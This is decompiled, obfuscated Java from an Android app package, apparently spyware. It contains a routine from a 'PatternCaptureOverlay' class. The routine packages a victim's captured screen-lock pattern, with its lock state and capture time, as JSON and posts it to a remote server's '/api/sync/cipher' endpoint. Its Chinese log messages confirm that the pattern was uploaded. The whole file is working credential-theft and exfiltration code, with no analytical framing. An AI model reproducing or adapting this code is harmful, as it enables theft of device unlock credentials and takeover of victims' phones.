package com.storm.safe.rock.service.modules.cipher;

import java.util.List;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import okhttp3.MediaType;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import org.json.JSONObject;
import p000.AbstractC0715je;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.kg1;
import p000.l10;
import p000.t60;
import p000.tz0;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.modules.cipher.PatternCaptureOverlay$saveCipherToLocalService$1", m214403f = "PatternCaptureOverlay.kt", m214404l = {}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class PatternCaptureOverlay$saveCipherToLocalService$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public final /* synthetic */ String f53257a1;

    /* renamed from: a2 */
    public final /* synthetic */ String f53258a2;

    /* renamed from: a3 */
    public final /* synthetic */ C0337a3 f53259a3;

    /* renamed from: a4 */
    public final /* synthetic */ List f53260a4;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public PatternCaptureOverlay$saveCipherToLocalService$1(String str, String str2, C0337a3 c0337a3, List list, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f53257a1 = str;
        this.f53258a2 = str2;
        this.f53259a3 = c0337a3;
        this.f53260a4 = list;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new PatternCaptureOverlay$saveCipherToLocalService$1(this.f53257a1, this.f53258a2, this.f53259a3, this.f53260a4, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) throws Throwable {
        PatternCaptureOverlay$saveCipherToLocalService$1 patternCaptureOverlay$saveCipherToLocalService$1 = (PatternCaptureOverlay$saveCipherToLocalService$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2);
        C1351vv c1351vv = C1351vv.f60710b1;
        patternCaptureOverlay$saveCipherToLocalService$1.invokeSuspend(c1351vv);
        return c1351vv;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        C0337a3 c0337a3 = this.f53259a3;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        kg1.m213544f4(obj);
        try {
            JSONObject jSONObject = new JSONObject();
            List list = this.f53260a4;
            jSONObject.put("cipherGradeCode", "PASSWORD_QUALITY_PATTERN");
            jSONObject.put("textCipher", AbstractC0715je.m213295i2(list, "", null, null, null, 62));
            jSONObject.put("patternCipher", AbstractC0715je.m213295i2(list, ",", null, null, null, 62));
            boolean z = true;
            if (c0337a3.f53356b0 != 1) {
                z = false;
            }
            jSONObject.put("isLocked", z);
            jSONObject.put("captureTime", System.currentTimeMillis());
            Request.Builder builderHeader = new Request.Builder().url(this.f53257a1.concat("/api/sync/cipher")).header("X-Client-ID", this.f53258a2);
            RequestBody.Companion companion = RequestBody.Companion;
            String string = jSONObject.toString();
            t60.m214694b5(string, "json.toString()");
            Response responseExecute = c0337a3.f53360b4.newCall(builderHeader.post(companion.create(string, MediaType.Companion.get("application/json"))).build()).execute();
            List list2 = this.f53260a4;
            try {
                if (responseExecute.isSuccessful()) {
                    t60.m214714d6("PatternCaptureOverlay", "✅ 图案已上传到服务器: pattern=".concat(AbstractC0715je.m213295i2(list2, "-", null, null, null, 62)));
                } else {
                    t60.m214726f4("PatternCaptureOverlay", "⚠️ 上传图案失败: " + responseExecute.code());
                }
                responseExecute.close();
            } finally {
            }
        } catch (Exception e) {
            tz0.m214807a7("上传图案异常: ", e.getMessage(), "PatternCaptureOverlay");
        }
        return C1351vv.f60710b1;
    }
}
